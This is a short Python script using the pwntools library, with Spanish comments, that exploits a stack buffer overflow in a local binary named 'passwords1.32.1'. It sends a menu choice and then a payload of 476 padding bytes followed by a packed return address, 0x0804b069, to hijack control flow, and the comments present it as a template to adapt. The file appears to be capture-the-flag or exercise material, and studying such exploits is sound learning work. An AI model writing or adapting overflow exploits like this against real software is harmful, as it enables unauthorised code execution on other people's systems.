from pwn import *

# Creamos un proceso interactivo para la ejecución del programa
p = process('./passwords1.32.1')  # Reemplaza 'tu_programa' con el nombre de tu programa

# Enviamos el primer input
p.sendline('1')

# Construimos el payload para la explotación
payload = b"A" * 476 + p32(0x0804b069)  # Reemplaza 0x0804b069 con la dirección de retorno deseada

# Enviamos el payload
p.sendline(payload)

# Imprimimos la salida recibida del programa (si es necesario)
print(p.recvall().decode())

# Cerramos el proceso
p.close()
